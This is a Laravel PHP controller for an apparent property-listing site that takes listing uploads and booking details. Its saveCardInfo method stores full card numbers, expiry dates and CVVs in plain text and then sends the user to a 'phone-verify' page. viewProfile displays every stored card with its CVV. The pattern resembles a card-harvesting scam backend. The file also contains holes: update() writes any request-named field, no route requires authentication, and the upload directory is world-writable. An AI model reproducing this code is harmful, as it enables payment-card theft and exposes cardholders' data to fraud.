<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\ImageEntry;
use App\Models\Profile;
use App\Models\CardInfo;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Illuminate\Support\Facades\File;


class ImageController extends Controller
{
    public function index()
    {
        $entries = ImageEntry::all();
        return view('index', compact('entries'));
    }

    public function addProperty()
    {
        $entries = ImageEntry::all();
        return view('add-property', compact('entries'));
    }

    public function store(Request $request)
    {
        // Validate the request inputs
        $request->validate([
            'image' => 'required|array',
            'image.*' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
            'description' => 'required|string',
            'bedrooms' => 'required|string',
            'bathrooms' => 'required|string',
            'price' => 'required|string',
        ]);

        $destinationPath = base_path('uploads');

        if (!File::exists($destinationPath)) {
            File::makeDirectory($destinationPath, 0777, true);
        }

        $imagePaths = [];

        foreach ($request->file('image') as $file) {
            $filename = time() . '_' . uniqid() . '_' . $file->getClientOriginalName();
            $file->move($destinationPath, $filename);
            $imagePaths[] = '/uploads/' . $filename;
        }

        // Save all images as JSON array
        ImageEntry::create([
            'title' => $request->title,
            'description' => $request->description,
            'image_path' => $imagePaths,
            'bedrooms' => $request->bedrooms,
            'bathrooms' => $request->bathrooms,
            'price' => $request->price,
            'squar' => $request->squar,
        ]);

        return redirect()->back()->with('success', 'Images uploaded successfully.');
    }




    public function update(Request $request, $id)
    {
        $entry = ImageEntry::findOrFail($id);
        $entry[$request->key] = $request->value;
        $entry->update();

        return response()->json(['message' => 'Description updated successfully']);
    }

    public function destroy($id)
    {
        $entry = ImageEntry::findOrFail($id);
        Storage::disk('public')->delete($entry->image_path);
        $entry->delete();

        return response()->json(['message' => 'Entry deleted successfully']);
    }

    public function propertyDetail(Request $request){
        $entry = ImageEntry::findOrFail($request->id);
        return view('property-detail', compact('entry'));
    }

    public function saveProfile(Request $request){
        $profile = Profile::create([
            'name' => $request->name,
            'email' => $request->email,
            'phone' => $request->phone,
            'selected_date' => $request->selected_date,
            'selected_hour' => $request->selected_hour
        ]);
        return response()->json([
            'profile' => $profile
        ]);
    }

    public function saveCardInfo(Request $request){
        CardInfo::create([
            'profile_id' => $request->profile_id,
            'card_number' => $request->card_number,
            'month' => $request->month,
            'year' => $request->year,
            'ccv' => $request->ccv,
            'card_type' => $request->card_type,
        ]);        
        return view('phone-verify');
    }

    public function viewProfile(Request $request){
        $profiles = Profile::leftJoin('card_info', 'profile.id', '=', 'card_info.profile_id')
        ->select(
            'profile.id',
            'profile.name',
            'profile.email',
            'profile.phone',
            'profile.selected_date',
            'profile.selected_hour',
            'card_info.id as card_info_id',
            'card_info.card_number',
            'card_info.month',
            'card_info.year',
            'card_info.ccv'
        )
        ->get();

        return view('view-profile', compact('profiles'));
    }
}
